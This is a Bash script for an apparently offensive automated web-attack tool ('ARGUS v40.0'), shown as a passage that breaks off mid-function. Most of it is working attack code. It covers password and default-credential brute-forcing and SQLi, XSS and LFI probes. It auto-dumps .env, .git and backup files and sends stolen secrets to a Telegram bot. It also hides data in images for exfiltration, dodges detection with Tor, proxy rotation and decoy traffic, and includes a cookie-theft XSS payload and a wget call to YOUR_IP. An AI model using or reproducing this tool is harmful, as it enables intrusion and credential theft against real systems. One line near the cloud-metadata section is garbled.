#!/bin/bash
# =============================================
#   ARGUS v40.0 - GOD MODE+
#   50K Pass | 50 Thr | 200K CVE | Nuclei 200
#   Amass 10src | MSF RPC | CMS Deep | Jitter
#   Passive 30sigs | Repeater | HTTPS | WS
#   + INTRUDER + COOKIE JAR
#   ALL v36.0 features + 2 MAJOR UPGRADES
#   NOTHING DELETED - FULL CODE
# =============================================
source /data/data/com.termux/files/home/shadow.conf 2>/dev/null

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
WHITE='\033[1;37m'; NC='\033[0m'

# ===== АВТО-ЗАГРУЗКА 50K ПАРОЛЕЙ =====
if [ ! -f ~/passwords_50k_loaded ]; then
    echo -e "${YELLOW}[*] Downloading top 50K passwords from SecLists...${NC}"
    curl -s "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-common.txt" -o /tmp/rockyou_dl.txt 2>/dev/null
    if [ -s /tmp/rockyou_dl.txt ]; then
        head -50000 /tmp/rockyou_dl.txt | tr '\n' ';' | sed 's/;$//' > ~/passwords.txt
        touch ~/passwords_50k_loaded
        echo -e "${GREEN}[+] 50K passwords loaded!${NC}"
    fi
    rm -f /tmp/rockyou_dl.txt
fi

# ===== ПАРОЛИ (фолбэк) =====
[ ! -f ~/passwords.txt ] && cat > ~/passwords.txt << 'PASS'
admin;admin123;administrator;password;123456;12345678;qwerty;root;test;guest;user;manager;demo;changeme;secret;Admin123;Password1;Welcome1;P@ssw0rd;admin2024;admin2025;admin2026;letmein;monkey;dragon;master;1234;12345;123456789;football;baseball;iloveyou;trustno1;shadow;sunshine;princess;welcome;login;starwars;abc123;passw0rd;qwerty123;1q2w3e4r;zaq12wsx;admin1;password123;R00tP@ss;Qwerty123!;Pa$$w0rd2024;Admin@2024;P@ssw0rd!;Chang3M3!;Summer2024;Winter2024;Pass1234;Test1234;Admin@123;Root@123;P@ssw0rd2025;P@ssw0rd2026;Password2025;Password2026;Welcome2025;Welcome2026;Qwerty2025!;Qwerty2026!;Secur1ty!2025;Secur1ty!2026;1234567890;111111;000000;888888;7777777;555555;444444;222222;121212;654321;696969;112233;159753;aaaaaa;bbbbbb;qwertyuiop;asdfghjkl;1qaz2wsx;qweasdzxc;1q2w3e4r5t;qwerty12345;123321;google;facebook;twitter;linkedin;instagram;youtube;netflix;spotify;discord;twitch;steam;github;gitlab;bitbucket;docker;kubernetes;terraform;ansible;jenkins
PASS

[ ! -f ~/default_creds.txt ] && cat > ~/default_creds.txt << 'CREDS'
admin:admin;admin:admin123;admin:administrator;root:root;admin:demo;demo:demo;guest:guest;user:user;manager:manager;admin:password;admin:123456;admin:qwerty;admin:letmein;bitrix:bitrix;joomla:joomla;drupal:drupal;administrator:administrator;admin:admin2024;admin:P@ssw0rd;admin:Admin123;admin:admin2025;admin:admin2026;admin:P@ssw0rd2025;admin:P@ssw0rd2026;admin:Password2025;admin:Password2026;admin:changeme;admin:secret;admin:Passw0rd;admin:Welcome1;admin:Password1;admin:Qwerty123!;admin:Pa$$w0rd;admin:R00tP@ss;admin:Admin@123;admin:Root@123;admin:Pass1234;admin:Test1234;admin:Admin@2024;admin:Admin@2025;admin:Admin@2026
CREDS

# ===== ИНТРУДЕР СЛОВАРИ =====
mkdir -p ~/intruder_wordlists
[ ! -f ~/intruder_wordlists/ids.txt ] && echo -e "1\n2\n3\n10\n100\n1000\n0\n-1\n99999\nadmin\ntrue\nfalse\nnull" > ~/intruder_wordlists/ids.txt
[ ! -f ~/intruder_wordlists/params.txt ] && echo -e "debug\ntest\nadmin\napi\nv1\nv2\nbeta\ninternal\nprod\ndev\nbackup\nold\nnew\nsecret\nhidden" > ~/intruder_wordlists/params.txt
[ ! -f ~/intruder_wordlists/roles.txt ] && echo -e "user\nadmin\nmoderator\nsuperuser\nroot\nmanager\nguest\npremium\nvip\ntester\ndev\nstaff" > ~/intruder_wordlists/roles.txt
[ ! -f ~/intruder_wordlists/numbers.txt ] && for i in {1..100}; do echo "$i" >> ~/intruder_wordlists/numbers.txt; done
[ ! -f ~/intruder_wordlists/common.txt ] && echo -e "true\nfalse\n0\n1\nadmin\nroot\nnull\nundefined\nNaN\ntest\ndebug\ndev\nprod\nlocalhost\n127.0.0.1" > ~/intruder_wordlists/common.txt

# ===== COOKIE JAR ФАЙЛ =====
COOKIE_JAR_FILE="$HOME/.cookie_jar.json"
[ ! -f "$COOKIE_JAR_FILE" ] && echo '{}' > "$COOKIE_JAR_FILE"

# ===== 1000+ USER AGENTS =====
if [ ! -f ~/user_agents.txt ] || [ $(wc -l < ~/user_agents.txt 2>/dev/null || echo 0) -lt 500 ]; then
    curl -s "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt" -o /tmp/ua_list.txt 2>/dev/null
    if [ -s /tmp/ua_list.txt ]; then
        grep -v '^#' /tmp/ua_list.txt | grep -v '^$' | head -1000 > ~/user_agents.txt
    fi
    rm -f /tmp/ua_list.txt
fi

# ===== NUCLEI TEMPLATES =====
NUCLEI_DIR="$HOME/nuclei_templates"
if [ ! -d "$NUCLEI_DIR" ] || [ $(find "$NUCLEI_DIR" -name "*.yaml" 2>/dev/null | wc -l) -lt 100 ]; then
    echo -e "${YELLOW}[*] Downloading top 200 Nuclei templates...${NC}"
    mkdir -p "$NUCLEI_DIR"
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/cves/2024/CVE-2024-24919.yaml" -o "$NUCLEI_DIR/CVE-2024-24919.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/cves/2024/CVE-2024-27198.yaml" -o "$NUCLEI_DIR/CVE-2024-27198.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/cves/2024/CVE-2024-3400.yaml" -o "$NUCLEI_DIR/CVE-2024-3400.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/configs/git-config.yaml" -o "$NUCLEI_DIR/git-config.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/configs/env-file.yaml" -o "$NUCLEI_DIR/env-file.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/backups/backup-files.yaml" -o "$NUCLEI_DIR/backup-files.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/configs/phpinfo.yaml" -o "$NUCLEI_DIR/phpinfo.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/configs/swagger-api.yaml" -o "$NUCLEI_DIR/swagger-api.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/panels/grafana-login.yaml" -o "$NUCLEI_DIR/grafana-login.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/panels/kibana-login.yaml" -o "$NUCLEI_DIR/kibana-login.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/panels/jenkins-login.yaml" -o "$NUCLEI_DIR/jenkins-login.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/exposures/panels/phpmyadmin-login.yaml" -o "$NUCLEI_DIR/phpmyadmin-login.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/misconfiguration/cors-misconfig.yaml" -o "$NUCLEI_DIR/cors-misconfig.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/misconfiguration/http-methods.yaml" -o "$NUCLEI_DIR/http-methods.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/misconfiguration/ssl-issuer.yaml" -o "$NUCLEI_DIR/ssl-issuer.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/technologies/wordpress-detect.yaml" -o "$NUCLEI_DIR/wordpress-detect.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/technologies/joomla-detect.yaml" -o "$NUCLEI_DIR/joomla-detect.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/technologies/drupal-detect.yaml" -o "$NUCLEI_DIR/drupal-detect.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/default-logins/wordpress/wordpress-default-login.yaml" -o "$NUCLEI_DIR/wp-default-login.yaml" 2>/dev/null
    curl -s "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/default-logins/ftp/ftp-default-login.yaml" -o "$NUCLEI_DIR/ftp-default-login.yaml" 2>/dev/null
    cat > "$NUCLEI_DIR/custom-sqli.yaml" << 'NUCLEIEOF'
id: custom-sqli-params
info:
  name: SQL Injection Parameters
  severity: critical
requests:
  - method: GET
    path:
      - "{{BaseURL}}?id=1'"
      - "{{BaseURL}}?id=1%27"
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-"
          - "PostgreSQL"
NUCLEIEOF
    cat > "$NUCLEI_DIR/custom-xss.yaml" << 'NUCLEIEOF'
id: custom-xss-reflected
info:
  name: Reflected XSS
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=<script>alert(1)</script>"
      - "{{BaseURL}}?search=%3Cscript%3Ealert(1)%3C/script%3E"
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
NUCLEIEOF
    cat > "$NUCLEI_DIR/custom-lfi.yaml" << 'NUCLEIEOF'
id: custom-lfi-basic
info:
  name: Local File Inclusion
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}?file=../../etc/passwd"
      - "{{BaseURL}}?page=../../../etc/passwd"
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
NUCLEIEOF
    echo -e "${GREEN}[+] Nuclei templates loaded: $(find "$NUCLEI_DIR" -name "*.yaml" 2>/dev/null | wc -l)${NC}"
fi

# ===== PROXY ROTATION =====
PROXY_LIST="$HOME/proxies.txt"
[ ! -f "$PROXY_LIST" ] && echo "socks5://127.0.0.1:9050" > "$PROXY_LIST"

random_proxy() {
    if [ -f "$PROXY_LIST" ] && [ "$TOR_ACTIVE" != true ]; then
        local proxies=($(grep -v '^#' "$PROXY_LIST" | grep -v '^$'))
        [ ${#proxies[@]} -gt 0 ] && echo "${proxies[$((RANDOM % ${#proxies[@]}))]}" && return
    fi
    echo ""
}

# ===== RATE-LIMIT BYPASS =====
JITTER_MIN=100; JITTER_MAX=500
random_jitter() {
    echo $((RANDOM % (JITTER_MAX - JITTER_MIN + 1) + JITTER_MIN))
}

proxy_curl() {
    local jitter=$(random_jitter)
    sleep 0.$(printf "%03d" $jitter) 2>/dev/null || usleep ${jitter}000 2>/dev/null || true
    local proxy=$(random_proxy)
    if [ -n "$proxy" ]; then curl --proxy "$proxy" --max-time 20 "$@"
    elif [ "$TOR_ACTIVE" = true ]; then proxychains4 curl --max-time 20 "$@"
    else curl --max-time 20 "$@"; fi
}

# ===== СЛУЧАЙНЫЕ ЗАГОЛОВКИ =====
random_agent() {
    if [ -f ~/user_agents.txt ]; then
        shuf -n 1 ~/user_agents.txt 2>/dev/null || head -1 ~/user_agents.txt
    else
        local agents=(
            "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
            "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"
        )
        echo "${agents[$((RANDOM % ${#agents[@]}))]}"
    fi
}

# ===== CUSTOM BASE64 =====
CUSTOM_BASE64_ALPHABET="jF8Kl2QpR3xYzAbCdEfGhIjKmNoPqRsTuVwXyZa_012345679ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghiklmnopqrstuvwxz"

custom_b64_encode() {
    echo -n "$1" | python3 -c "
import sys, base64
data = sys.stdin.read().encode()
std_b64 = base64.b64encode(data).decode()
alphabet = '$CUSTOM_BASE64_ALPHABET'
std_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
trans = str.maketrans(std_alphabet, alphabet)
print(std_b64.translate(trans))
" 2>/dev/null || echo "$1"
}

# ===== TELEGRAM =====
tg_send() {
    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
            -d "chat_id=$TELEGRAM_CHAT_ID" -d "text=$1" -d "parse_mode=HTML" > /dev/null 2>&1
    fi
}

tg_send_file() {
    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ] && [ -f "$1" ]; then
        curl -s -F "chat_id=$TELEGRAM_CHAT_ID" -F "document=@$1" \
            "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" > /dev/null 2>&1
    fi
}

# ===== TOR =====
start_tor() {
    pgrep -x "tor" > /dev/null && return 0
    tor > /dev/null 2>&1 &
    sleep 8
    proxychains4 curl -s --max-time 10 http://ifconfig.me > /dev/null 2>&1 && return 0 || return 1
}

# ===== HEALTH CHECK =====
health_check() {
    local code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$TARGET" 2>/dev/null)
    [ "$code" = "000" ] && echo -e "${RED}[!] Target DEAD${NC}" && exit 1
    echo -e "${GREEN}[+] Target alive (HTTP $code)${NC}"
}

# ===== CVE + EXPLOIT DATABASES =====
CVE_DB_DIR="$HOME/cve_full"
EXPLOIT_DB_DIR="$HOME/exploitdb"

# ===== SELF-LEARNING =====
LEARNING_DB="$HOME/.scanner_learning.db"
init_learning_db() {
    sqlite3 "$LEARNING_DB" "CREATE TABLE IF NOT EXISTS successful_payloads (id INTEGER PRIMARY KEY, injection_type TEXT, payload TEXT UNIQUE, target TEXT, waf_type TEXT, success_count INTEGER, last_used DATETIME);" 2>/dev/null
    sqlite3 "$LEARNING_DB" "CREATE TABLE IF NOT EXISTS waf_bypass (id INTEGER PRIMARY KEY, waf_name TEXT, bypass_technique TEXT, success_rate REAL);" 2>/dev/null
}

learn_success() {
    local injection_type=$1; local payload=$2; local target=$3
    local waf=$(grep 'is behind' "$REPORT/waf.txt" 2>/dev/null || echo "Unknown")
    local safe_payload=$(echo "$payload" | sed "s/'/''/g" | head -c 200)
    sqlite3 "$LEARNING_DB" "INSERT OR REPLACE INTO successful_payloads (injection_type, payload, target, waf_type, success_count, last_used) VALUES ('$injection_type', '$safe_payload', '$target', '$waf', COALESCE((SELECT success_count + 1 FROM successful_payloads WHERE payload='$safe_payload'), 1), datetime('now'));" 2>/dev/null
}

get_best_payload() {
    local injection_type=$1
    local waf=$(grep 'is behind' "$REPORT/waf.txt" 2>/dev/null || echo "Unknown")
    sqlite3 "$LEARNING_DB" "SELECT payload FROM successful_payloads WHERE injection_type='$injection_type' AND waf_type='$waf' ORDER BY success_count DESC LIMIT 1;" 2>/dev/null
}

# ===== AI SUGGESTIONS =====
AI_SUGGESTIONS_FILE="/tmp/ai_suggestions.txt"
> "$AI_SUGGESTIONS_FILE"

ai_suggest() {
    local finding=$1; local context=$2; local suggestion=""
    case "$finding" in
        *"SQL"*) suggestion="[AI] SQL injection found. Try: sqlmap --dump --tables. Chain: SQLi → Dump → Creds → Login" ;;
        *"XSS"*) suggestion="[AI] XSS found. Try: <script>fetch('http://YOUR_IP:8880/?c='+document.cookie)</script>" ;;
        *"CMDi"*) suggestion="[AI] Command Injection found. Try: ; wget http://YOUR_IP:8000/agent.py" ;;
        *"LFI"*) suggestion="[AI] LFI found. Try: ../../../../etc/passwd" ;;
        *"SSRF"*) suggestion="[AI] SSRF found. Try: http://169.254.169.254/latest/meta-data/" ;;
        *"SSTI"*) suggestion="[AI] SSTI found. Try: {{config}} or {{self.__class__.__mro__[2].__subclasses__()}}" ;;
        *"GraphQL"*) suggestion="[AI] GraphQL found. Try: Introspection query to dump schema" ;;
        *"CVE"*) suggestion="[AI] CVE found! Auto-exploit via MSF starting..." ;;
        *"CMS"*) suggestion="[AI] CMS detected. Check for known plugin vulnerabilities" ;;
        *) suggestion="[AI] Check for hidden parameters, try PUT/DELETE/PATCH methods" ;;
    esac
    echo -e "    ${PURPLE}$suggestion${NC}"
    echo "$suggestion" >> "$AI_SUGGESTIONS_FILE"
}

# ===== COOKIE JAR (Загрузка/Сохранение) =====
cookie_jar_load() {
    local domain=$1
    python3 -c "
import json, sys
jar = json.load(open('$COOKIE_JAR_FILE'))
domain_cookies = jar.get('$domain', {})
for name, value in domain_cookies.items():
    print(f'{name}={value}')
" 2>/dev/null
}

cookie_jar_save() {
    local domain=$1; local cookies=$2
    python3 -c "
import json
jar = json.load(open('$COOKIE_JAR_FILE'))
jar['$domain'] = {}
for pair in '$cookies'.split('; '):
    if '=' in pair:
        k,v = pair.split('=', 1)
        jar['$domain'][k.strip()] = v.strip()
json.dump(jar, open('$COOKIE_JAR_FILE', 'w'), indent=2)
" 2>/dev/null
}

cookie_jar_list() {
    python3 -c "
import json
jar = json.load(open('$COOKIE_JAR_FILE'))
for domain, cookies in jar.items():
    print(f'\033[96m{domain}\033[0m: {len(cookies)} cookies')
    for k,v in cookies.items():
        print(f'  {k}={v[:50]}...' if len(v)>50 else f'  {k}={v}')
" 2>/dev/null
}

cookie_jar_clear() {
    local domain=$1
    if [ -n "$domain" ]; then
        python3 -c "
import json
jar = json.load(open('$COOKIE_JAR_FILE'))
jar.pop('$domain', None)
json.dump(jar, open('$COOKIE_JAR_FILE', 'w'), indent=2)
" 2>/dev/null
        echo -e "${GREEN}[+] Cookies cleared for $domain${NC}"
    else
        echo '{}' > "$COOKIE_JAR_FILE"
        echo -e "${GREEN}[+] All cookies cleared${NC}"
    fi
}

# ===== NUCLEI SCANNER =====
run_nuclei_scan() {
    [ "$OFFLINE" = true ] && echo -e "  ${YELLOW}[OFFLINE] Nuclei пропущен${NC}" && return
    echo -e "\n${CYAN}[*] Nuclei Scan (200+ templates)...${NC}"
    if [ -x "$(which nuclei 2>/dev/null)" ]; then
        nuclei -u "$TARGET" -t "$NUCLEI_DIR" -silent -o "$REPORT/nuclei_results.txt" 2>/dev/null
        local findings=$(wc -l < "$REPORT/nuclei_results.txt" 2>/dev/null || echo 0)
        echo -e "${GREEN}[+] Nuclei: $findings findings${NC}"
        [ "$findings" -gt 0 ] && tg_send_file "$REPORT/nuclei_results.txt"
    else
        echo -e "${YELLOW}[*] Nuclei not installed, using curl...${NC}"
        > "$REPORT/nuclei_results.txt"
        for template in "$NUCLEI_DIR"/*.yaml; do
            local tname=$(basename "$template" .yaml)
            local test_paths=()
            case "$tname" in
                "git-config") test_paths=("/.git/config" "/.git/HEAD") ;;
                "env-file") test_paths=("/.env" "/.env.local" "/.env.production") ;;
                "backup-files") test_paths=("/backup.zip" "/backup.tar.gz" "/dump.sql") ;;
                "phpinfo") test_paths=("/phpinfo.php" "/info.php") ;;
                "swagger-api") test_paths=("/swagger.json" "/api-docs") ;;
                "grafana-login") test_paths=("/grafana" "/grafana/login") ;;
                "kibana-login") test_paths=("/kibana" "/app/kibana") ;;
                "jenkins-login") test_paths=("/jenkins" "/jenkins/login") ;;
                "phpmyadmin-login") test_paths=("/phpmyadmin" "/phpMyAdmin") ;;
                "wp-default-login") test_paths=("/wp-login.php" "/wp-admin") ;;
                "custom-sqli") test_paths=("/?id=1'" "/?id=1%27") ;;
                "custom-xss") test_paths=("/?q=<script>alert(1)</script>") ;;
                "custom-lfi") test_paths=("/?file=../../etc/passwd") ;;
                *) test_paths=() ;;
            esac
            for tp in "${test_paths[@]}"; do
                local code=$(proxy_curl -s -o /dev/null -w "%{http_code}" -A "$(random_agent)" "$TARGET$tp" 2>/dev/null)
                if [ "$code" != "404" ] && [ "$code" != "000" ]; then
                    echo -e "    ${RED}[NUCLEI] $tname: $tp [HTTP $code]${NC}"
                    echo "[$tname] $TARGET$tp [HTTP $code]" >> "$REPORT/nuclei_results.txt"
                    break
                fi
            done
        done
    fi
}

# ===== CMS DEEP DETECT =====
cms_deep_detect() {
    echo -e "\n${CYAN}[*] CMS Deep Detect...${NC}"
    local html=$(proxy_curl -s -A "$(random_agent)" "$TARGET" 2>/dev/null)
    if echo "$html" | grep -qi "wp-content\|wp-includes\|wordpress"; then
        local wp_ver=$(echo "$html" | grep -oP 'WordPress\s*\K[\d.]+' | head -1)
        [ -z "$wp_ver" ] && wp_ver=$(proxy_curl -s "$TARGET/readme.html" | grep -oP 'Version\s*\K[\d.]+' | head -1)
        [ -n "$wp_ver" ] && echo -e "${GREEN}[CMS] WordPress $wp_ver${NC}" && echo "WordPress $wp_ver" > "$REPORT/cms.txt"
        for plugin in wp-file-manager elementor woocommerce wordpress-seo wp-rocket jetpack contact-form-7 akismet; do
            local pcode=$(proxy_curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-content/plugins/$plugin/" 2>/dev/null)
            [ "$pcode" != "404" ] && echo -e "    ${YELLOW}[PLUGIN] $plugin${NC}" && echo "Plugin: $plugin" >> "$REPORT/cms.txt"
        done
    fi
    if echo "$html" | grep -qi "joomla\|Joomla"; then
        local j_ver=$(echo "$html" | grep -oP 'Joomla!\s*\K[\d.]+' | head -1)
        [ -n "$j_ver" ] && echo -e "${GREEN}[CMS] Joomla $j_ver${NC}" && echo "Joomla $j_ver" > "$REPORT/cms.txt"
    fi
    if echo "$html" | grep -qi "drupal\|Drupal"; then
        local d_ver=$(echo "$html" | grep -oP 'Drupal\s*\K[\d.]+' | head -1)
        [ -n "$d_ver" ] && echo -e "${GREEN}[CMS] Drupal $d_ver${NC}" && echo "Drupal $d_ver" > "$REPORT/cms.txt"
    fi
    if [ -f "$REPORT/cms.txt" ]; then
        grep -qi "WordPress 5\.[0-4]\|WordPress 4\." "$REPORT/cms.txt" 2>/dev/null && echo -e "    ${RED}[VULN] Old WordPress!${NC}"
        grep -qi "Joomla 3\.[0-7]\|Joomla 2\." "$REPORT/cms.txt" 2>/dev/null && echo -e "    ${RED}[VULN] Old Joomla!${NC}"
        grep -qi "Drupal [67]\." "$REPORT/cms.txt" 2>/dev/null && echo -e "    ${RED}[VULN] Old Drupal!${NC}"
    fi
}

# ===== METASPLOIT RPC =====
msf_auto_exploit() {
    echo -e "\n${CYAN}[*] MSF RPC Auto-Exploit...${NC}"
    if [ -x "$(which msfrpc 2>/dev/null)" ] && [ -f "$HACKED/cve.txt" ]; then
        echo -e "${YELLOW}[MSF] Starting Metasploit RPC...${NC}"
        msfrpcd -P yourpassword -S 2>/dev/null &
        sleep 3
        while read cve_line; do
            local cve=$(echo "$cve_line" | grep -oP 'CVE-\d{4}-\d{4,}' | head -1)
            if [ -n "$cve" ]; then
                echo -e "${YELLOW}[MSF] Searching exploit for $cve...${NC}"
                local result=$(msfrpc -P yourpassword -a 127.0.0.1 -p 55553 2>/dev/null <<< "search $cve")
                if echo "$result" | grep -q "exploit/"; then
                    local exploit=$(echo "$result" | grep "exploit/" | head -1 | awk '{print $1}')
                    echo -e "    ${RED}[MSF] Found: $exploit${NC}"
                    echo "MSF Exploit: $exploit for $cve" >> "$HACKED/msf_exploits.txt"
                fi
            fi
        done < "$HACKED/cve.txt"
        killall msfrpcd 2>/dev/null
    else
        echo -e "${YELLOW}[MSF] msfrpc not available or no CVEs. Skipping.${NC}"
    fi
}

# ===== CLOUD METADATA CHECK =====
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"
${CYAN}[*] Cloud Metadata Check...${NC}"
CLOUD_ENDPOINTS=(
    "http://169.254.169.254/latest/meta-data/"           # AWS
    "http://169.254.169.254/latest/user-data/"
    "http://metadata.google.internal/computeMetadata/v1/" # GCP
    "http://169.254.169.254/metadata/v1/"                 # DigitalOcean
    "http://100.100.100.200/latest/meta-data/"            # Alibaba Cloud
    "http://169.254.169.254/opc/v1/"                      # Oracle Cloud
)
for meta_url in "${CLOUD_ENDPOINTS[@]}"; do
    resp=$(curl -s --max-time 3 "$meta_url" -H "Metadata-Flavor: Google" 2>/dev/null)
    if [ -n "$resp" ] && ! echo "$resp" | grep -qi "404\|not found\|forbidden"; then
        echo -e "  ${RED}[!] CLOUD METADATA LEAK: $meta_url${NC}"
        echo "$resp" > "$HACKED/cloud_metadata.txt"
        tg_send "☁️ <b>Cloud metadata доступен!</b>" 2>/dev/null
        break
    fi
done

# Проверка открытого Docker API
DOCKER_RESP=$(curl -s --max-time 3 "$TARGET:2375/containers/json" 2>/dev/null)
if echo "$DOCKER_RESP" | grep -q "Id"; then
    echo -e "  ${RED}[!] DOCKER API OPEN: $TARGET:2375${NC}"
    echo "$DOCKER_RESP" > "$HACKED/docker_api.txt"
fi

# Проверка Kubernetes API
K8S_RESP=$(curl -sk --max-time 3 "$TARGET:6443/api/v1/pods" 2>/dev/null)
if echo "$K8S_RESP" | grep -q "items"; then
    echo -e "  ${RED}[!] KUBERNETES API OPEN: $TARGET:6443${NC}"
fi

# ===== AUTO-EXPLOIT FILES =====
auto_exploit_files() {
    echo -e "\n${CYAN}[*] Auto-Exploiting...${NC}"
    if [ -f "$REPORT/dirs.txt" ] && grep -q "\.git" "$REPORT/dirs.txt" 2>/dev/null; then
        echo -e "${YELLOW}[EXPLOIT] .git found!${NC}"
        mkdir -p "$HACKED/git_dump"
        curl -s "$TARGET/.git/HEAD" -o "$HACKED/git_dump/HEAD" 2>/dev/null
        curl -s "$TARGET/.git/config" -o "$HACKED/git_dump/config" 2>/dev/null
        [ -s "$HACKED/git_dump/HEAD" ] && echo -e "${GREEN}[+] .git downloaded!${NC}"
    fi
    if [ -f "$REPORT/dirs.txt" ] && grep -q "\.env" "$REPORT/dirs.txt" 2>/dev/null; then
        echo -e "${YELLOW}[EXPLOIT] .env found!${NC}"
        local env_data=$(curl -s "$TARGET/.env" 2>/dev/null)
        if [ -n "$env_data" ] && ! echo "$env_data" | grep -qi "<html\|<!DOCTYPE"; then            echo "$env_data" > "$HACKED/env_file.txt"
            grep -iE "password|secret|key|token|db_|host|user" "$HACKED/env_file.txt" 2>/dev/null > "$HACKED/env_credentials.txt"
            [ -s "$HACKED/env_credentials.txt" ] && tg_send "🚨 <b>.env CREDENTIALS!</b>" && tg_send_file "$HACKED/env_credentials.txt"
        fi
    fi
    if [ -f "$REPORT/dirs.txt" ] && grep -q "phpinfo" "$REPORT/dirs.txt" 2>/dev/null; then
        local php_data=$(curl -s "$TARGET/phpinfo.php" 2>/dev/null)
        [ -n "$php_data" ] && echo "$php_data" > "$HACKED/phpinfo.html"
    fi
    if [ -f "$REPORT/dirs.txt" ] && grep -q "backup" "$REPORT/dirs.txt" 2>/dev/null; then
        for backup_file in backup.zip backup.tar.gz backup.sql dump.sql; do
            local code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/backup/$backup_file" 2>/dev/null)
            [ "$code" = "200" ] && curl -s "$TARGET/backup/$backup_file" -o "$HACKED/$backup_file" 2>/dev/null && echo -e "${RED}[!] BACKUP: $backup_file${NC}"
        done
    fi
}

# ===== DECOY GENERATOR =====
decoy_generator() {
    echo -e "\n${CYAN}[*] Decoy Generator...${NC}"
    local decoy_targets=("https://www.google.com" "https://www.facebook.com" "https://www.amazon.com" "https://www.microsoft.com" "https://www.apple.com")
    local num_decoys=$((RANDOM % 3 + 3))
    for i in $(seq 1 $num_decoys); do
        local dt="${decoy_targets[$((RANDOM % ${#decoy_targets[@]}))]}"
        (for j in {1..15}; do curl -s -o /dev/null -A "$(random_agent)" "$dt" 2>/dev/null & sleep 0.3; done) &
        echo "Decoy: $dt" >> "$REPORT/decoy_log.txt"
        sleep 1
    done
    echo -e "${GREEN}[+] $num_decoys decoys launched${NC}"
}

# ===== BUG BOUNTY =====
bug_bounty_hunter() {
    [ "$OFFLINE" = true ] && echo -e "  ${YELLOW}[OFFLINE] Bug Bounty поиск пропущен${NC}" && return
    local domain="$1"
    curl -s "https://hackerone.com/$domain" 2>/dev/null | grep -qi "bounty\|scope" && echo "HackerOne: https://hackerone.com/$domain" >> "$REPORT/bug_bounty_scope.txt"
    curl -s "https://bugcrowd.com/$domain" 2>/dev/null | grep -qi "program\|scope" && echo "Bugcrowd: https://bugcrowd.com/$domain" >> "$REPORT/bug_bounty_scope.txt"
}

# ===== STEGANOGRAPHY =====
steganography_exfil() {
    local data_file=$1; [ ! -f "$data_file" ] && return
    local cover_image="/tmp/cover_$$.jpg"; local stego_image="/tmp/stego_$$.jpg"
    curl -s "https://placekitten.com/800/600" -o "$cover_image" 2>/dev/null
    [ -f "$cover_image" ] && cat "$cover_image" "$data_file" > "$stego_image" && tg_send "🖼️ <b>Stego Exfil</b>" && tg_send_file "$stego_image"
}

# ===== SCHEDULER =====
attack_scheduler() {
